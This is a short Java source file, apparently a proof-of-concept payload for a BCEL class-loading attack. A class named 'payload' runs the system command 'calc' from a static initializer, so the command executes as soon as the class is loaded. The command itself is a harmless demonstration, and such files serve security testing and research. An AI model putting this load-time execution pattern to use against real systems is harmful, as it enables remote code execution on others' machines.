package BCEL;

import java.io.IOException;
class payload {
    public static void main(String[] args) {
        System.out.println(1);
    }
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}